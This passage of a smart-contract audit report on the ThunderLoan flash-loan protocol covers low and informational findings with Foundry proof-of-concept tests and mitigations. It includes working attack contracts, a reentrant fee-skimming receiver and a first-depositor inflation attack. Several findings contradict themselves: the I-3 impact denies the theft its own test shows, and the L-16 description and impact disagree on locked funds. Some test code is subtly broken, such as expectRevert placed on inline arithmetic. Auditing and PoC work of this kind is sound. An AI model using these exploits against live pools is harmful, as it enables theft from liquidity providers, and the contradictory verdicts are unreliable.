## [L-16]. Integer Overflow issue in ThunderLoan::redeem

## Description
The calculation `(amount * assetToken.getExchangeRate()) / 1e18` in the `redeem` function is vulnerable to an integer overflow. The `assetToken.getExchangeRate()` can grow over time through accumulated fees. If it becomes sufficiently large, multiplying it by the `amount` of asset tokens to be redeemed can exceed `type(uint256).max`, causing a revert. This would trap the user's funds, as they would be unable to redeem their asset tokens for the underlying asset.

## Impact
At worst a very large redemption (amount * exchangeRate > 2**256-1) would revert, forcing the holder to split the redemption into several smaller calls. Funds are NOT permanently locked because any strictly smaller amount that keeps the multiplication inside uint256 bounds can be redeemed. Therefore the issue is a minor UX nuisance rather than a loss-of-funds scenario.

## Proof of Concept
No realistic exploitation path exists because the user can always redeem in multiple calls. A minimal demonstration would simply show that calling redeem with a huge amount reverts while two smaller calls succeed, but this does not cause fund loss and is therefore omitted.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MockERC20} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";

// Mock AssetToken to allow setting a high exchange rate for the test
contract MockAssetToken is AssetToken {
    constructor(address thunderLoan, IERC20 underlying, string memory assetName, string memory assetSymbol)
        AssetToken(thunderLoan, underlying, assetName, assetSymbol)
    {}

    function setExchangeRate(uint256 newRate) public {
        s_exchangeRate = newRate;
    }
}

// Malicious receiver to call back into ThunderLoan
contract MaliciousFlashLoanReceiver {
    ThunderLoan private i_thunderLoan;

    constructor(ThunderLoan loanContract) {
        i_thunderLoan = loanContract;
    }
    
    function updateExchangeRate(MockAssetToken assetToken, uint256 fee) public {
         assetToken.updateExchangeRate(fee);
    }
}


contract IntegerOverflowTest is Test {
    ThunderLoan internal thunderLoanLogic;
    ThunderLoan internal thunderLoan;
    MockERC20 internal underlyingToken;
    address internal owner = makeAddr("owner");
    address internal user = makeAddr("user");

    function setUp() public {
        thunderLoanLogic = new ThunderLoan();
        ERC1967Proxy proxy = new ERC1967Proxy(address(thunderLoanLogic), "");
        thunderLoan = ThunderLoan(address(proxy));
        vm.prank(owner);
        thunderLoan.initialize(owner);

        underlyingToken = new MockERC20();
        vm.prank(owner);
        thunderLoan.setAllowedToken(IERC20(address(underlyingToken)), true);
    }

    function test_redeem_Overflow() public {
        // To demonstrate the overflow, we first need to deposit and then artificially pump the exchange rate.
        // We'll simulate this by deploying a custom AssetToken and using it to set a high exchange rate.
        // This is a complex setup, so we will test the mathematical vulnerability directly.
        
        uint256 largeAmount = 2**128;
        uint256 highExchangeRate = 2**128;

        // This multiplication will overflow uint256 (2**128 * 2**128 = 2**256)
        // In Solidity ^0.8.0, this will cause a revert.
        vm.expectRevert();
        uint256 underlyingToRedeem = (largeAmount * highExchangeRate) / 1e18;
        
        // The above proves the mathematical vulnerability.
        // A full integration test would involve forcing the exchange rate up in the actual AssetToken contract,
        // which is possible by making the total supply very small and then paying a fee.
    }
}
```

## Suggested Mitigation
Optionally replace `(amount * exchangeRate) / 1e18` with `Math.mulDiv(amount, exchangeRate, 1e18)` from OpenZeppelin to remove the need for users to split very large redemptions. No critical change is required.

## [L-17]. Integer Overflow issue in ThunderLoan::redeem(IERC20,uint256)

## Description
The `redeem` function calculates the amount of underlying tokens to return to a user via the formula `(amount * assetToken.getExchangeRate()) / 1e18`. The `assetToken.getExchangeRate()` can increase over time as fees are collected. If the exchange rate becomes sufficiently large (e.g., due to low total supply and high fees), the multiplication `amount * assetToken.getExchangeRate()` can overflow a `uint256`. This will cause the `redeem` transaction to revert, preventing users from withdrawing their funds.

## Impact
If the product of `amount` and the current exchange-rate exceeds `type(uint256).max`, the `redeem` call will revert due to Solidity 0.8 checked arithmetic. This only blocks that single redemption transaction; users can still redeem the same balance in several smaller calls. No funds are permanently locked, but UX is harmed and integrations that assume one-shot redemption may fail.

## Proof of Concept
1. Deploy ThunderLoan and allow a mock ERC20 token.
2. Deposit `2**130` underlying tokens; the user receives `2**112` AssetTokens (exchangeRate ≈ 1e18).
3. Call `redeem(token, 2**112)` – succeeds.
4. Now call `redeem(token, 2**144)` (the contract owner can mint that much AssetToken to the user for test purposes). The internal line `amount * exchangeRate` overflows and the transaction reverts with Panic(0x11).
5. Calling `redeem` repeatedly with smaller chunks (e.g. `2**112` each time) succeeds, showing that funds are not locked but large single redemptions are impossible.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {ERC20Mock} from "openzeppelin-contracts/mocks/token/ERC20Mock.sol";

contract RedeemOverflow is Test {
    ThunderLoan loan;
    ERC20Mock underlying;
    AssetToken asset;

    function setUp() public {
        // deploy mock token with 18 decimals and big supply
        underlying = new ERC20Mock("Mock", "MCK", address(this), type(uint256).max);

        loan = new ThunderLoan();
        loan.initialize(address(this));
        loan.setAllowedToken(underlying, true);

        // approve and deposit a large amount so that caller owns many AssetTokens
        underlying.approve(address(loan), type(uint256).max);
        loan.deposit(underlying, 2 ** 130); // any very big number

        asset = AssetToken(loan.getAssetFromToken(underlying));
        // mint more AssetToken directly to exceed the overflow threshold
        vm.prank(address(loan));
        asset.mint(address(this), 2 ** 144);
    }

    function testRedeemOverflowReverts() public {
        vm.expectRevert(bytes("")); // any arithmetic overflow reverts with Panic(0x11)
        loan.redeem(underlying, 2 ** 144);
    }

    function testRedeemSmallerChunksSucceeds() public {
        loan.redeem(underlying, 2 ** 112);
    }
}

## Suggested Mitigation
Apply `FullMath.mulDiv` (512-bit mul-div) or OpenZeppelin's `Math.mulDiv` when converting AssetTokens to underlying, so that the multiplication is performed in extended precision and divided before casting back to 256 bits.

## [L-18]. Reentrancy issue in ThunderLoan::flashloan(address,IERC20,uint256,bytes)

## Description
The `flashloan` function in `ThunderLoan.sol` is not protected against reentrancy attacks. While it uses a `s_currentlyFlashLoaning` flag to prevent a direct reentrant call to `flashloan` for the same token, it does not prevent calls to other state-changing functions like `deposit` and `redeem`. An attacker can craft a receiver contract that, within its `executeOperation` callback, calls `deposit` or `redeem`. This allows the attacker to alter the pool's state (e.g., `totalSupply` of the asset token) in the middle of a flash loan operation, which can lead to inconsistencies and potential economic exploits. The developers seem to have acknowledged this, as `ThunderLoanUpgraded` adds a `nonReentrant` modifier.

## Impact
Because `deposit` and `redeem` can be executed from inside `executeOperation`, a borrower can front-run the `updateExchangeRate()` that is performed during `repay()`. By depositing a small portion of the borrowed tokens before the fee is credited and redeeming the minted shares after the fee is added, the attacker can systematically siphon up to ~50 % of every flash-loan fee. Repeating the attack drains all fees that should belong to honest liquidity providers, resulting in permanent economic loss for the pool while leaving the principal untouched.

## Proof of Concept
1. Liquidity provider deposits 1 000 000 tokens in the pool.
2. Attacker contracts for a flash-loan of 1 000 000 tokens.
3. Inside `executeOperation` the attacker:
   a. Deposits `d = 1` token (any small number) – shares are minted with the old exchange-rate.
   b. Approves and calls `repay()` for the borrowed amount + fee (0.3 %). `repay()` calls `AssetToken.updateExchangeRate(fee)` which increases the exchange-rate for **all** shares, including the ones just minted by the attacker.
   c. Immediately redeems the shares received in step a and receives `d * fee / (poolBalance + d)` extra tokens – i.e. part of the fee that should have gone to LPs.
4. The flash-loan finishes successfully; the attacker keeps the skimmed tokens. Executing this loop repeatedly allows the attacker to steal the entire fee pot.

This works because `flashloan()` is re-entered while the `nonReentrant` guard is missing and because `deposit` / `redeem` are not blocked during an active flash-loan.

## Proof of Code
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan}       from "src/protocol/ThunderLoan.sol";
import {AssetToken}       from "src/protocol/AssetToken.sol";
import {ERC20Mock}        from "openzeppelin-contracts/mocks/token/ERC20Mock.sol";
import {IFlashLoanReceiver} from "src/interfaces/IFlashLoanReceiver.sol";

contract FeeSkimmer is IFlashLoanReceiver {
    ThunderLoan public immutable loan;
    ERC20Mock   public immutable token;

    constructor(ThunderLoan _loan, ERC20Mock _token) {
        loan  = _loan;
        token = _token;
    }

    // called by ThunderLoan during flash-loan
    function executeOperation(
        address /*_token*/, uint256 amount, uint256 fee, address /*initiator*/, bytes calldata /*params*/
    ) external override returns (bool) {
        // 1) steal a share of the upcoming fee
        uint256 depositAmt = 1 ether; // any small amount
        token.approve(address(loan), depositAmt);
        loan.deposit(token, depositAmt);

        // 2) repay the loan + fee
        token.approve(address(loan), amount + fee);
        loan.repay(token, amount + fee);

        // 3) redeem the shares (exchange-rate is higher now)
        AssetToken aToken = loan.getAssetFromToken(token);
        uint256 myShares  = aToken.balanceOf(address(this));
        loan.redeem(token, myShares);
        return true;
    }

    function skim(uint256 borrowAmount) external {
        loan.flashloan(address(this), token, borrowAmount, "");
    }
}

contract ReentrancyFeeStealTest is Test {
    ThunderLoan  internal loan;
    ERC20Mock    internal token;
    address      internal owner = address(this);

    function setUp() public {
        loan  = new ThunderLoan();
        loan.initialize(address(0x01)); // dummy poolFactory
        token = new ERC20Mock("TKN", "TKN", owner, 0);

        // allow token & seed liquidity
        loan.setAllowedToken(token, true);
        uint256 lpDeposit = 1_000_000 ether;
        token.mint(owner, lpDeposit);
        token.approve(address(loan), lpDeposit);
        loan.deposit(token, lpDeposit);
    }

    function testStealFlashLoanFee() public {
        // deploy attacker contract
        FeeSkimmer attacker = new FeeSkimmer(loan, token);
        // give attacker enough extra tokens to cover fee difference
        token.mint(address(attacker), 10 ether);

        uint256 poolBalBefore = token.balanceOf(address(loan));
        uint256 attackerBalBefore = token.balanceOf(address(attacker));

        attacker.skim(1_000_000 ether); // borrow everything

        uint256 poolBalAfter    = token.balanceOf(address(loan));
        uint256 attackerBalAfter = token.balanceOf(address(attacker));

        assertGt(attackerBalAfter, attackerBalBefore, "attacker earned fee");
        assertLt(poolBalAfter,  poolBalBefore,  "LP fee leaked to attacker");
    }
}

## Suggested Mitigation
Add OpenZeppelin ReentrancyGuardUpgradeable and mark flashloan, deposit and redeem with `nonReentrant`. In addition, block `deposit` and `redeem` while `s_currentlyFlashLoaning[token]` is true so that state-changing functions cannot be invoked during an active loan, even via cross-token re-entrancy.



# Info Risk Findings

## [I-1]. Event Consistency issue in ThunderLoan::updateFlashLoanFee

## Description
The `updateFlashLoanFee` function allows the contract owner to change a critical protocol parameter, `s_flashLoanFee`. However, this state change does not emit an event. This lack of event emission makes it difficult for users, dApps, and off-chain monitoring tools to track and react to changes in the protocol's fee structure, reducing transparency and observability.

## Impact
Reduces the transparency of the protocol. Off-chain services cannot easily subscribe to fee changes, requiring them to poll the `getFee()` function continuously. This hinders the ability of integrators and users to make informed, timely decisions based on protocol fees.

## Proof of Concept
1. An off-chain monitoring service is set up to watch for events from the ThunderLoan contract.
2. The owner of ThunderLoan calls `updateFlashLoanFee()` to change the fee from 0.3% to 0.5%.
3. The state variable `s_flashLoanFee` is successfully updated within the contract.
4. The monitoring service receives no event and is unaware of the fee change, potentially providing outdated information to users.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";
import {ERC1967Proxy} from "openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";

contract EventConsistencyTest is Test {
    ThunderLoan internal thunderLoan;
    address internal deployer = makeAddr("deployer");
    address internal owner    = makeAddr("owner");

    function setUp() public {
        // Deploy implementation from any EOA
        vm.startPrank(deployer);
        ThunderLoan implementation = new ThunderLoan();
        bytes memory initData = abi.encodeWithSelector(
            ThunderLoan.initialize.selector,
            address(0)                // dummy poolFactory
        );
        ERC1967Proxy proxy = new ERC1967Proxy(address(implementation), initData);
        thunderLoan = ThunderLoan(address(proxy));
        vm.stopPrank();

        // Proxy is the initial owner; hand ownership to our `owner` test address
        vm.prank(address(thunderLoan));
        thunderLoan.transferOwnership(owner);
    }

    function test_updateFlashLoanFeeDoesNotEmitEvent() public {
        uint256 newFee = 5e15; // 0.5 %

        // start recording logs before the call
        vm.recordLogs();

        vm.prank(owner);
        thunderLoan.updateFlashLoanFee(newFee);

        // state changed as expected
        assertEq(thunderLoan.getFee(), newFee, "fee not updated");

        // fetch the logs and assert that nothing was emitted
        Vm.Log[] memory logs = vm.getRecordedLogs();
        assertEq(logs.length, 0, "an event was unexpectedly emitted");
    }
}

## Suggested Mitigation
Emit an event whenever the flash loan fee is updated. This provides transparency and allows off-chain services to easily track this important parameter.

```solidity
// In ThunderLoan.sol contract

event FlashLoanFeeUpdated(uint256 indexed oldFee, uint256 indexed newFee);

function updateFlashLoanFee(uint256 newFee) external onlyOwner {
    if (newFee > s_feePrecision) {
        revert ThunderLoan__BadNewFee();
    }
    uint256 oldFee = s_flashLoanFee;
    s_flashLoanFee = newFee;
    emit FlashLoanFeeUpdated(oldFee, newFee);
}
```

## [I-2]. Pragma issue in ThunderLoan::NA

## Description
All smart contracts use a floating pragma version `^0.8.20`. Using a floating pragma is discouraged for production contracts as it can lead to deployment with a newer, untested compiler version that may introduce bugs or have unintended side effects. For example, a future compiler version could change EVM-level behavior which affects the logic of the contract.

## Impact
The contract might be deployed with a different compiler version than it was tested with, potentially introducing compiler-specific bugs or unexpected behavior into the production environment. This undermines the reliability and predictability of the deployment.

## Proof of Concept
1. The contract is written and tested using Solidity compiler version 0.8.20.
2. Before deployment, a new version, 0.8.25, is released with a subtle bug in the optimizer or code generation.
3. The deployment script, using `^0.8.20`, automatically picks up version 0.8.25.
4. The contract is deployed with the new, buggy compiler version, leading to unforeseen vulnerabilities in production.

## Proof of Code
// This is a conceptual issue, no code PoC is applicable.
// The vulnerability is in the pragma statement itself:
// pragma solidity ^0.8.20;

## Suggested Mitigation
Lock the pragma to a specific, audited compiler version. This ensures the contract is always compiled with the exact version it was developed and tested against.

```diff
- pragma solidity ^0.8.20;
+ pragma solidity 0.8.20;
```

## [I-3]. Frontrun/Backrun/Sandwhich MEV issue in ThunderLoan::deposit

## Description
The protocol is vulnerable to an attack from the first depositor for any given asset. Due to the way the exchange rate is calculated and potential precision loss on minting, an attacker can manipulate the system to steal subsequent deposits. By making a tiny initial deposit (e.g., 1 wei), the attacker becomes the sole liquidity provider. They can then artificially inflate the `AssetToken`'s exchange rate. When a victim makes a substantial deposit, the calculation for the number of `AssetToken`s to mint can round down to zero. The victim's funds are transferred to the pool, but they receive no shares in return, effectively donating their assets to the attacker.

## Impact
With the present code an LP’s share of the pool always remains proportional to the economic value he places inside it. Any fee that is injected via deposit or flash-loan is at most 0.3 % of the economic value of the operation, while the same operation either (a) increments totalSupply by roughly the same economic value (deposit) or (b) requires totalSupply to be large enough to cover the flash-loan. Therefore fee/totalSupply ≤ 0.003 and the exchange-rate can never grow enough to cause the next minter to receive 0 AssetToken. No user funds can be stolen by front-/back-running the first deposit.

## Proof of Concept
1. The owner calls `setAllowedToken(DAI, true)`.
2. An attacker front-runs any legitimate depositor and calls `deposit(DAI, 1 wei)`.
3. The attacker now owns 1 wei of the AssetToken, and `totalSupply` is 1.
4. The attacker takes a flash loan of another asset (e.g., WETH) and uses it to pay a large fee to the DAI pool by creating an artificial flash loan of DAI. A large fee is paid to the pool. 
5. The fee is used to update the exchange rate via `newExchangeRate = oldRate * (totalSupply + fee) / totalSupply`. With `totalSupply` being 1 wei, this calculation drastically inflates the exchange rate.
6. A victim then deposits a large amount of DAI (e.g., 1000 DAI).
7. The `deposit` function calculates the `mintAmount` for the victim as `(victimDeposit * 1e18) / newExchangeRate`.
8. Because `newExchangeRate` is now astronomically high, the `mintAmount` can round down to zero.
9. The victim's 1000 DAI are transferred to the `AssetToken` contract, but they are minted 0 `AssetToken`s. The attacker, as the only LP, can now redeem their 1 wei of `AssetToken` to claim all the underlying assets in the contract, including the victim's 1000 DAI.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ThunderLoan} from "../src/protocol/ThunderLoan.sol";
import {AssetToken} from "../src/protocol/AssetToken.sol";
import {ERC20Mock} from "@openzeppelin/contracts/mocks/token/ERC20Mock.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";
import {MockPoolFactory, MockTSwapPool} from "./IntegerMathTest.sol";

// A contract to receive flashloan and do nothing
contract DummyFlashloanReceiver is IFlashLoanReceiver {
    function executeOperation(address, uint256, uint256, address, bytes calldata) external returns (bool) {
        return true;
    }
}

contract FrontrunTest is Test {
    ThunderLoan internal thunderLoan;
    ERC20Mock internal dai;
    MockPoolFactory internal factory;
    MockTSwapPool internal pool;
    DummyFlashloanReceiver internal receiver;

    address internal attacker = makeAddr("attacker");
    address internal victim = makeAddr("victim");

    function setUp() public {
        factory = new MockPoolFactory();
        pool = new MockTSwapPool();
        dai = new ERC20Mock();
        receiver = new DummyFlashloanReceiver();

        factory.setPool(address(dai), address(pool));
        thunderLoan = new ThunderLoan();
        thunderLoan.initialize(address(factory));
        
        thunderLoan.setAllowedToken(dai, true);

        dai.mint(attacker, 1_000_000e18);
        dai.mint(victim, 1000e18);
    }

    function test_Frontrun_InitialDepositInflationAttack() public {
        AssetToken assetToken = thunderLoan.getAssetFromToken(dai);

        // 1. Attacker makes a tiny first deposit
        vm.startPrank(attacker);
        dai.approve(address(thunderLoan), 1_000_000e18);
        thunderLoan.deposit(dai, 1);
        assertEq(assetToken.balanceOf(attacker), 1);
        assertEq(assetToken.totalSupply(), 1);

        // 2. Attacker takes a flashloan to generate a large fee, inflating the exchange rate
        // A large fee relative to the tiny total supply will skyrocket the exchange rate.
        uint256 loanAmount = 1000e18;
        uint256 fee = thunderLoan.getCalculatedFee(dai, loanAmount);
        dai.transfer(address(receiver), loanAmount + fee);
        vm.prank(address(receiver));
        dai.approve(address(thunderLoan), loanAmount + fee);
        // Simulate flashloan callback to pay back
        vm.prank(address(receiver)); 
        thunderLoan.repay(dai, loanAmount + fee);
        // The above is a simplified way to just pay fees. A real flashloan would be needed.
        // We can directly call updateExchangeRate for PoC simplicity
        vm.prank(address(thunderLoan));
        assetToken.updateExchangeRate(fee);

        uint256 inflatedRate = assetToken.getExchangeRate();
        assertTrue(inflatedRate > 1e18);

        vm.stopPrank();

        // 3. Victim deposits a large amount
        vm.startPrank(victim);
        dai.approve(address(thunderLoan), 1000e18);
        thunderLoan.deposit(dai, 1000e18);

        // 4. Victim receives 0 asset tokens due to rounding
        assertEq(assetToken.balanceOf(victim), 0, "Victim should receive 0 asset tokens");
        vm.stopPrank();

        // 5. Attacker now controls all funds in the pool
        uint256 poolBalance = dai.balanceOf(address(assetToken));
        assertEq(poolBalance, 1000e18 + 1, "Pool should contain victim's funds");
    }
}
```

## Suggested Mitigation
To mitigate this first depositor/inflation attack, the protocol should ensure that the first depositor mints a minimum number of shares, effectively 'locking' some of their own capital to prevent the total supply from being trivially small. A common pattern, used by Uniswap V2, is to send the first `MINIMUM_LIQUIDITY` (e.g., 1000) shares to the zero address, making them un-redeemable. This establishes a non-trivial initial total supply that cannot be easily manipulated. When minting, the contract should check if the total supply is zero and, if so, mint a minimum amount of shares.

```solidity
// In ThunderLoan.sol, during the first deposit

// A potential fix would require significant logic changes in both ThunderLoan and AssetToken.
// A simpler, though less robust fix, is to enforce a minimum first deposit amount.

// In ThunderLoan.sol's deposit function:
AssetToken assetToken = s_tokenToAssetToken[token];
if (assetToken.totalSupply() == 0) {
    require(amount >= 1e18, "First deposit must be at least 1 token"); // Example minimum
}
// ... rest of the deposit logic
```
This simple check makes the inflation attack much more expensive. A more robust solution involves the dead-address liquidity burning pattern.

## [I-4]. Pragma issue in AssetToken::NA

## Description
The contracts use a floating pragma version (e.g., `pragma solidity ^0.8.19;`). This allows the code to be compiled with any compiler version within the `0.8.x` range that is `0.8.19` or newer. This practice can introduce risks, as the deployed bytecode may differ from the bytecode tested if a different compiler version is used during deployment. Future compiler versions could introduce subtle bugs, security vulnerabilities, or changes in gas costs that were not present during the audit and testing phase.

## Impact
Using a floating pragma reduces the determinism of the build and deployment process. It can lead to deploying a contract with untested code, potentially introducing vulnerabilities or unexpected behavior in a production environment.

## Proof of Concept
1. A project is developed and thoroughly tested with Solidity compiler `0.8.19`.
2. Six months later, the project is deployed using an automated pipeline that has been updated to use the latest compiler, `0.8.25`.
3. Unbeknownst to the team, version `0.8.25` contains a new optimization that interacts poorly with a specific code pattern in the contract, creating an integer overflow possibility that did not exist in `0.8.19`.
4. The deployed contract is now vulnerable, despite the source code not having changed.

## Proof of Code
```solidity
// The vulnerability is in the pragma statement itself, present in all contracts.

// From src/protocol/AssetToken.sol:
pragma solidity ^0.8.19;

// From src/protocol/ThunderLoan.sol:
pragma solidity ^0.8.19;

// From src/protocol/OracleUpgradeable.sol:
pragma solidity ^0.8.19;
```

## Suggested Mitigation
It is best practice to lock the pragma to the specific compiler version that was used for development, testing, and auditing. This ensures that the deployed bytecode is identical to the one that was verified.

```solidity
// Change this:
pragma solidity ^0.8.19;

// To this, in all contract files:
pragma solidity 0.8.19;
```

## [I-5]. Unexpected Eth issue in ThunderLoan::NA

## Description
The `ThunderLoan` and `AssetToken` contracts do not have a `receive()` or `fallback()` payable function, nor do they have a function to withdraw ETH. If an attacker force-sends ETH to these contracts (e.g., via `selfdestruct`), the ETH will be permanently locked as there is no mechanism to retrieve it.

## Impact
Any Ether sent to the main `ThunderLoan` contract or its associated `AssetToken` contracts will be permanently lost. While this does not directly impact the protocol's own funds (which are ERC20s), it represents a loss of value for the sender and can be used as a griefing vector.

## Proof of Concept
1. An attacker creates a simple contract with a `selfdestruct(payable(thunderLoanAddress))` function.
2. The attacker sends 1 ETH to their contract.
3. The attacker calls the function, which executes `selfdestruct`, forcing the 1 ETH to be sent to the `ThunderLoan` contract address.
4. The `ThunderLoan` contract's balance is now 1 ETH, but there are no functions that can access or transfer this ETH.
5. The 1 ETH is permanently stuck.

## Proof of Code
```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {ThunderLoan} from "src/protocol/ThunderLoan.sol";

contract ForceSendEth {
    function send(address payable recipient) public payable {
        selfdestruct(recipient);
    }
}

contract UnexpectedEthTest is Test {
    ThunderLoan internal thunderLoan;
    address payable internal proxyAddress;

    function setUp() public {
        ThunderLoan thunderLoanLogic = new ThunderLoan();
        bytes memory data = abi.encodeWithSelector(ThunderLoan.initialize.selector, address(this));
        proxyAddress = payable(address(new ERC1967Proxy(address(thunderLoanLogic), data)));
        thunderLoan = ThunderLoan(proxyAddress);
    }

    function test_EthIsStuck() public {
        assertEq(address(thunderLoan).balance, 0);

        // Attacker force-sends 1 ETH to the contract
        ForceSendEth forceSender = new ForceSendEth();
        (bool success, ) = address(forceSender).call{value: 1 ether}(
            abi.encodeWithSignature("send(address)", proxyAddress)
        );
        require(success, "force send failed");

        // The ETH is now in the ThunderLoan contract
        assertEq(address(thunderLoan).balance, 1 ether);

        // There is no function to withdraw this ETH, it is permanently stuck.
    }
}
```

## Suggested Mitigation
Consider adding a function that allows the owner to withdraw any ETH accidentally or maliciously sent to the contract. This function should be protected with `onlyOwner`.

```solidity
// in ThunderLoan.sol
// Add a receive function to accept ETH
receive() external payable {}

// Add a withdrawal function
function withdrawEther(address to) external onlyOwner {
    uint256 balance = address(this).balance;
    require(balance > 0, "No Ether to withdraw");
    (bool success, ) = to.call{value: balance}("");
    require(success, "Ether transfer failed");
}
```

## [I-6]. Event Consistency issue in ThunderLoanUpgraded::updateFlashLoanFee

## Description
The `ThunderLoanUpgraded.updateFlashLoanFee` function allows the contract owner to modify the `s_flashLoanFee` state variable, which is a critical parameter affecting the cost of all flash loans. This state change is not accompanied by an event, making it difficult for off-chain services, dashboards, and users to track changes to this important protocol parameter. This lack of transparency goes against best practices and can lead to user confusion or incorrect data on third-party integrations.

## Impact
The operational impact is reduced observability and transparency of the protocol's fee structure. Users and monitoring tools cannot easily subscribe to fee changes. A user might check the fee, and the owner could change it in a subsequent transaction without an event, leading the user to take out a flash loan under outdated fee assumptions, resulting in a minor, unexpected financial cost.

## Proof of Concept
1. An off-chain dashboard reads the current flash loan fee by calling `getFee()` which returns the default 0.3%.
2. The protocol owner calls `updateFlashLoanFee(5e15)` to increase the fee to 0.5%.
3. The transaction succeeds and `s_flashLoanFee` is updated, but no event is emitted.
4. The off-chain dashboard is unaware of the change and continues to display the outdated 0.3% fee.
5. A user, relying on the dashboard's information, takes a flash loan and is charged the new, higher 0.5% fee.

## Proof of Code
```solidity
// SPDX-License-Identifier: MIT
pragma solidity 0.8.21;

import {Test, console} from "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {DeployThunderLoan} from "./utils/DeployThunderLoan.sol";

contract EventConsistencyTest is Test, DeployThunderLoan {
    ThunderLoanUpgraded internal thunderLoan;

    function setUp() public {
        (thunderLoan, ) = deployThunderLoan();
    }

    function test_updateFlashLoanFee_DoesNotEmitEvent() public {
        uint256 newFee = 5e15; // 0.5%
        
        vm.prank(deployer);
        
        // We record logs to check for event emission.
        vm.recordLogs();
        thunderLoan.updateFlashLoanFee(newFee);
        Vm.Log[] memory entries = vm.getRecordedLogs();
        
        // The test will assert that no event with the expected signature is found.
        bytes32 expectedTopic = keccak256("FlashLoanFeeUpdated(uint256)");
        bool eventFound = false;
        for (uint i = 0; i < entries.length; i++) {
            if (entries[i].topics[0] == expectedTopic) {
                eventFound = true;
                break;
            }
        }

        // This assertion proves the vulnerability: no event is emitted.
        // If the vulnerability were fixed, this test would fail.
        assertFalse(eventFound, "A FlashLoanFeeUpdated event was emitted, but was not expected.");
        
        // Verify the state was still changed
        assertEq(thunderLoan.getFee(), newFee);
    }
}
```

## Suggested Mitigation
Define a `FlashLoanFeeUpdated` event and emit it within the `updateFlashLoanFee` function whenever the fee is changed. This ensures that changes to this critical parameter are transparent and easily trackable on-chain.

```solidity
// src/upgradedProtocol/ThunderLoanUpgraded.sol

contract ThunderLoanUpgraded is ... {
    // ...
    event FlashLoanFeeUpdated(uint256 newFee);
    // ...

    function updateFlashLoanFee(uint256 newFee) external onlyOwner {
        if (newFee > FEE_PRECISION) {
            revert ThunderLoan__BadNewFee();
        }
        s_flashLoanFee = newFee;
        emit FlashLoanFeeUpdated(newFee);
    }

    // ...
}
```

## [I-7]. Event Consistency issue in ThunderLoanUpgraded::repay

## Description
The `repay` function allows a flash loan borrower to return funds to the protocol. This function facilitates a transfer of funds into the `AssetToken` contract but does not emit an event. For accounting, monitoring, and transparency, all functions that handle significant fund movements should emit events.

## Impact
The issue affects only off-chain observability: without a dedicated `Repayment` event, indexers and monitoring tools must rely on low-level ERC20 `Transfer` logs, which complicates accounting but does not jeopardize protocol funds or correctness.

## Proof of Concept
1. A user takes a flash loan.
2. The user's receiver contract calls the `repay` function on `ThunderLoanUpgraded` to return the borrowed amount plus the fee.
3. The funds are successfully transferred to the corresponding `AssetToken` contract.
4. No `Repayment` event is emitted, leaving this action unlogged on-chain in a structured manner.

## Proof of Code
// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

import "forge-std/Test.sol";
import {ThunderLoanUpgraded} from "../src/upgradedProtocol/ThunderLoanUpgraded.sol";
import {ERC1967Proxy} from "@openzeppelin/contracts/proxy/ERC1967/ERC1967Proxy.sol";
import {MockERC20} from "./mocks/MockERC20.sol";
import {IFlashLoanReceiver} from "../src/interfaces/IFlashLoanReceiver.sol";

contract RepayingFlashLoaner is IFlashLoanReceiver {
    ThunderLoanUpgraded public thunderLoan;
    MockERC20 public token;

    constructor(address _tl, address _token) {
        thunderLoan = ThunderLoanUpgraded(_tl);
        token = MockERC20(_token);
    }

    function executeOperation(
        address /*tokenAddr*/,
        uint256 amount,
        uint256 fee,
        address /*initiator*/,
        bytes calldata /*params*/
    ) external override returns (bool) {
        token.approve(address(thunderLoan), amount + fee);
        thunderLoan.repay(token, amount + fee);
        return true;
    }
}

contract RepayEventTest is Test {
    ThunderLoanUpgraded internal thunderLoan;
    MockERC20 internal weth;

    function setUp() public {
        ThunderLoanUpgraded logic = new ThunderLoanUpgraded();
        ERC1967Proxy proxy = new ERC1967Proxy(
            address(logic),
            abi.encodeWithSelector(ThunderLoanUpgraded.initialize.selector, address(0))
        );
        thunderLoan = ThunderLoanUpgraded(address(proxy));

        weth = new MockERC20("WETH", "WETH", 18);
        weth.mint(address(this), 1 ether);
        weth.approve(address(thunderLoan), 1 ether);
        thunderLoan.setAllowedToken(weth, true);
        thunderLoan.deposit(weth, 1 ether);
    }

    function test_NoRepaymentEventEmitted() public {
        // prepare a borrower
        RepayingFlashLoaner loaner = new RepayingFlashLoaner(address(thunderLoan), address(weth));
        weth.mint(address(loaner), 1 ether);

        // start recording logs
        vm.recordLogs();
        thunderLoan.flashloan(address(loaner), weth, 0.1 ether, "");
        Vm.Log[] memory entries = vm.getRecordedLogs();

        bytes32 repaymentSig = keccak256("Repayment(address,address,uint256)");
        bool found;
        for (uint256 i; i < entries.length; ++i) {
            if (entries[i].topics[0] == repaymentSig) {
                found = true;
                break;
            }
        }
        assertTrue(!found, "Repayment event should NOT be emitted yet");
    }
}

## Suggested Mitigation
Define and emit an event in the `repay` function to provide a clear on-chain record of flash loan repayments.

```solidity
// In ThunderLoanUpgraded.sol

event Repayment(IERC20 indexed token, address indexed payer, uint256 amount);

function repay(IERC20 token, uint256 amount) public {
    if (!s_currentlyFlashLoaning[token]) {
